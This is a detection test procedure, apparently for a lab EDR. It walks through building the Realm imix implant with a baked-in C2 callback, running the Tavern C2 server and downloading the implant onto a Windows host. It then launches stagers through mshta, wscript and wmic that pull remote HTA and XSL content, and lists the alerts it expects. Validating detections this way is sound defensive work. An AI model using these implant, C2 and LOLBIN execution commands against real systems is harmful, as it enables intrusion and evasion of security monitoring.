# Test: Evasion — script-host LOLBIN launchers (mshta / wscript / wmic)

**Chain:** stage execution through signed script interpreters — no PowerShell in the
process tree, no encoded command, no PS logging path. The pre-PowerShell-era tradecraft
that still works when PS rules fire everywhere.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).

test scripts are self-contained (benign stagers).

**Victim (elevated PowerShell):** `.\test.ps1`

```powershell
mshta \\172.16.69.109\share\stager.hta          # or a staged local .hta
wscript C:\Users\Public\stager.vbs               # VBS host
wmic /format:"http://172.16.69.109:8000/x.xsl"   # remote XSL (CS stager pattern)
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `EVT-SCRIPTHOST` | high | kernel-fed 4688: script host with remote/user-profile content — catches even fast-exit hosts |
| `PROC-SCRIPTHOST` | high | same pattern on the WMI poll |
| `EVT-4688-TEMP` | high | stager files launched from user paths |

**Verified live** (the `wscript` case; the EVT variant exists specifically because
script hosts exit faster than the 3s WMI poll).

**Cleanup:** delete staged stager files.
